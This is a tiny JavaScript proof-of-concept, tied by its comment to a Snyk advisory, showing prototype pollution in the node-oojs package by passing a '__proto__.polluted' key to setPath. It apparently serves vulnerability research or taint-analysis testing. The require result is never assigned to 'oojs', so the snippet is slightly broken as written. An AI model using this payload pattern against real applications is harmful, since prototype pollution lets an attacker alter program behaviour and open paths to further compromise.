// https://snyk.io/vuln/SNYK-JS-NODEOOJS-598678
 
   

  require("node-oojs");
  oojs.setPath.__x_toTaint = true;
  oojs.setPath({ "__proto__.polluted": "yes" });
// End of file
